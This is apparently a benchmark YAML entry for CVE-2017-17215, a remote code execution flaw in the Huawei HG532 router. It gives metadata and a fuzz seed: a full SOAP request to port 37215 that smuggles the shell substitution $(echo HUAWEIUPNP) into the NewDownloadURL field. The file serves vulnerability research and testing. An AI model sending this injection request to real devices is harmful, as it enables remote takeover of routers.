benchmark/CVE-2017-17215/CVE-2017-17215.yml

vulnerability_id: CVE-2017-17215
affected_vendor: Huawei
firmware_version: HG532
firmware_architecture: MIPS32
file_system: Squashfs
vulnerability_type: Remote Code Execution
vulnerability_score: 8.8
vulnerability_severity: High
CWE_type: CWE-20
communication_protocol: SOAP
simulation_method: qemu-system:mips
vulnerability_description: Huawei HG532 with some customized versions has a remote code execution vulnerability. An authenticated attacker could send malicious packets to port 37215 to launch attacks. Successful exploit could lead to the remote execution of arbitrary code.
firmware_link: https://ia801309.us.archive.org/15/items/RouterHG532e/router%20HG532e.rar
fuzz_seed: |-
    POST /ctrlt/DeviceUpgrade_1 HTTP/1.1
    Host: 192.168.2.2:37215
    User-Agent: python-requests/2.25.1
    Connection: keep-alive
    Accept: */*
    Accept-Encoding: gzip, deflate
    Content-Length: 384

    <?xml version="1.0" ?>
        <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
        <s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">
        <NewStatusURL>www.baidu.com</NewStatusURL>
    <NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>
    </u:Upgrade>
        </s:Body>
        </s:Envelope>
